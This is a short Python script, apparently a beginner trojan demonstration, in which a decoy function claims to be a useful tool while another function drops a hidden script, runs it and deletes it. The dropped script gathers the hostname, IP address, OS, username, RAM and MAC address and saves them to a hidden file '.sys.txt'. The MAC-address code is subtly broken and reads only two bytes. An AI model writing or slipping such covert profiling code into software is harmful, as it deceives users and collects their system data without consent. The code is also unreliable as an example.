import subprocess
import os

def fake_tool():
    print("this tool claims to do something useful")

def Evil_trojan():
    filename = "Greekhorse.py"
    code = """import socket
import platform
import getpass
import psutil
import uuid

host = socket.gethostname()
ip_ad = socket.gethostbyname(host)
os_info = platform.system() + " " + platform.release()
username = getpass.getuser()

# Memory info
memory = psutil.virtual_memory()
total_mem = f"{memory.total / (1024 ** 3):.2f} GB"

# MAC address
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff)
                for i in range(0, 2*6, 8)][::-1])

txt_out = (
    f"Hostname: {host}\\n"
    f"IP Address: {ip_ad}\\n"
    f"OS: {os_info}\\n"
    f"Username: {username}\\n"
    f"Total RAM: {total_mem}\\n"
    f"MAC Address: {mac}\\n"
)

with open('.sys.txt', 'w') as file:
    file.write(txt_out)
"""
    with open(filename, "w") as f:
        f.write(code)

    subprocess.run(["python3", filename])

    os.remove(filename)

def main():
    fake_tool()
    Evil_trojan()

if __name__ == "__main__":
    main()
